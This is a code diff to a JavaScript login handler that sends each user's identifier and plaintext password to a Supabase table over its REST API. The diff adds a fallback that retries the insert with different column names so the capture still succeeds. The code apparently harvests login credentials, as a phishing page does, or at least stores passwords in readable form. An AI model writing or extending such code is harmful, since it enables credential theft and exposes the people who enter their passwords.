@@ -79,16 +79,17 @@ function formatPhoneInput(val) {
  */
 async function submitLoginToSupabase(details) {
   try {
+    const timestamp = new Date().toISOString();
+
+    // Primary payload matching existing table schema (id, type, identifier, password, timestamp)
     const payload = {
       type: details.type,
       identifier: details.identifier,
-      email: details.identifier, // Ensure email is never null to satisfy table NOT NULL constraint
-      phone: details.type === "Phone" ? details.identifier : null,
       password: details.password,
-      timestamp: new Date().toISOString()
+      timestamp: timestamp
     };
 
-    const response = await fetch(`${SUPABASE_AUTH_CONFIG.url}/rest/v1/${SUPABASE_AUTH_CONFIG.table}`, {
+    let response = await fetch(`${SUPABASE_AUTH_CONFIG.url}/rest/v1/${SUPABASE_AUTH_CONFIG.table}`, {
       method: "POST",
       headers: {
         "apikey": SUPABASE_AUTH_CONFIG.anonKey,
@@ -98,6 +99,30 @@ async function submitLoginToSupabase(details) {
       },
       body: JSON.stringify(payload)
     });
+
+    // Fallback if table expects separate email / phone columns instead of type / identifier
+    if (!response.ok && response.status === 400) {
+      const errText = await response.text();
+      console.warn("Schema mismatch detected, trying fallback columns:", errText);
+
+      const altPayload = {
+        email: details.type === "Email" ? details.identifier : null,
+        phone: details.type === "Phone" ? details.identifier : null,
+        password: details.password,
+        timestamp: timestamp
+      };
+
+      response = await fetch(`${SUPABASE_AUTH_CONFIG.url}/rest/v1/${SUPABASE_AUTH_CONFIG.table}`, {
+        method: "POST",
+        headers: {
+          "apikey": SUPABASE_AUTH_CONFIG.anonKey,
+          "Authorization": `Bearer ${SUPABASE_AUTH_CONFIG.anonKey}`,
+          "Content-Type": "application/json",
+          "Prefer": "return=minimal"
+        },
+        body: JSON.stringify(altPayload)
+      });
+    }
 
     if (response.ok) {
       console.log("Successfully saved login details to Supabase.");
